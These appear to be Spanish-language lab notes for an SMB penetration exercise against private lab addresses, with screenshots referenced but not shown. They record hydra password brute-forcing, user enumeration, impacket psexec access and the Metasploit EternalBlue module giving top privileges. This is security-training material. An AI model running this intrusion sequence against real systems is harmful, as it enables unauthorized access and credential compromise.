Primero realizamos un escaneo del puerto 445
```
nmap -sV -sC -p 445 10.2.23.39
```
![[Pasted image 20240425080225.png]]

Ahora probaremos a descubrir las contraseñas de los usuarios con hydra
```
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt smb
```
![[Pasted image 20240425080651.png]]

```
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.2.23.39 smb
```
![[Pasted image 20240425080749.png]]

Ahora probaremos a enumerar los usuarios del sistema con las siguiente herramientas
```
smbclient -L 10.2.23.39 -U vagrant
```
![[Pasted image 20240425081337.png]]

```
smbmap -u vagrant -p vagrant -H 10.2.23.39
```
![[Pasted image 20240425081407.png]]

```
enum4linux -u vagrant -p vagrant -U 10.2.23.39
```
![[Pasted image 20240425081744.png]]
![[Pasted image 20240425081817.png]]

Otra forma para enumerar usuarios de forma autimatica como en enum4linux es utilizar el siguiente modulo de metasploit
`scanner/smb/smb_enumusers`
![[Pasted image 20240425082422.png]]
![[Pasted image 20240425082501.png]]


Ahora utilizaremos la herramienta `psexec`que nos permite autenticarnos de forma remota a traes del servicio SMB
```
locate psexec.py
```
![[Pasted image 20240425082657.png]]


Copiamos el ejecutable en nuestra carpeta
```
cp /usr/share/doc/python3-impacket/examples/psexec.py
```
![[Pasted image 20240425082937.png]]

Damos permisos para poder ejecutar el archivo
```
chmod +x psexec.py
```
![[Pasted image 20240425083047.png]]

Ahora utilizamos la herramienta para obtener acceso al sistema
```
python3 psexec.py Administrator@10.0.31.252
```
![[Pasted image 20240425083426.png]]

Esta misma herramienta también la tenemos disponible en un modulo de metasploit
`exploit/windows/smb/psexec`
![[Pasted image 20240425083752.png]]

Lo configuramos
![[Pasted image 20240425084419.png]]
![[Pasted image 20240425084523.png]]
![[Pasted image 20240425084542.png]]

------
Otra forma de poder acceder sabiendo que la maquina victima es windows server 2012 es utilizar la vulnerabilidad eternalblue
`exploit/windows/smb/ms17_010_eternalblue`
![[Pasted image 20240425084754.png]]
![[Pasted image 20240425085004.png]]

Y como podemos ver hemos obtenido acceso con los privilegios mas altos
![[Pasted image 20240425085134.png]]